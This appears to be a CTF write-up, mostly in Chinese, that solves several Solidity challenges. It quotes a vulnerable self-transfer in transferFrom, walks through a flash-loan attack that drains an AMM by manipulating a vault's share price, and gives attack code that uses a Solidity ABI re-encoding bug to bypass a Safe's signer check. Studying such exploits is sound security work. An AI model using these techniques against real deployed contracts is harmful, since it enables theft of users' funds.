## Escrow

## GreyHats-Dollar
Self Transfer in `transferFrom()`

```solidity
function transferFrom(address from, address to, uint256 amount) public update returns (bool) {
        if (from != msg.sender) allowance[from][msg.sender] -= amount;

        uint256 _shares = _GHDToShares(amount, conversionRate, false);
        uint256 fromShares = shares[from] - _shares;
        uint256 toShares = shares[to] + _shares;

        require(_sharesToGHD(fromShares, conversionRate, false) < balanceOf(from), "amount too small");
        require(_sharesToGHD(toShares, conversionRate, false) > balanceOf(to), "amount too small");

        shares[from] = fromShares;
        shares[to] = toShares;

        emit Transfer(from, to, amount);

        return true;
    }
```

## SimpleAMM
在初始化后，各个合约的状态是：

| Vault             |              |
| ----------------- | ------------ |
| totalAssets(Grey) | 2000e18      |
| totalSupply       | 1000e18      |
| sharePrice        | 2:1(Grey:SV) |

| AMM      |         |
| -------- | ------- |
| k        | 2000e18 |
| reserveX | 1000e18 |
| reserveY | 2000e18 |

因为amm有flashloan，所以我们可以先flashloan出来1000e18的sv，然后用这1000e18的sv从Vaule中提取出2000e18的grey，在存入1000e18的grey这时候状态就变成了

| Vault             |              |
| ----------------- | ------------ |
| totalAssets(Grey) | 1000e18      |
| totalSupply       | 1000e18      |
| sharePrice        | 1:1(Grey:SV) |

由于amm的价格依赖于vault，所以这时候我们不需要任何的amountIn就可以换出1000e18的grey，从而完成挑战

## Gnosis-Safe

Root Cause是https://soliditylang.org/blog/2022/08/08/calldata-tuple-reencoding-head-overflow-bug/，题目中Transaction的定义是:

```solidity
 struct Transaction {
        address signer;
        address to;
        uint256 value;
        bytes data;
    }
```

最后一个元素是`bytes` 动态元素，所以在`aggressive cleanup`的时候就会被清理成0.从而导致了绕过。

```solidity
transaction = ISafe.Transaction({
            signer: address(0x1337),
            to: address(grey),
            value: 0,
            data: abi.encodeCall(GREY.transfer, (msg.sender, 10_000e18))
        });
        bytes32 queueHash = safe.queueTransaction(v, r, s, transaction);
        console.logBytes32(queueHash);
        transaction2 = ISafe.Transaction({
            signer: address(0),
            to: address(grey),
            value: 0,
            data: abi.encodeCall(GREY.transfer, (msg.sender, 10_000e18))
        });
        bytes32 queueHash2 = keccak256(abi.encode(transaction2, v, r, s));
        console.logBytes32(queueHash2);
```
因为这个漏洞，所以在第一次提交transaction的时候他传入的其实就是signer=address(0)计算出的hash，从而绕过了executetransaction的signer检查。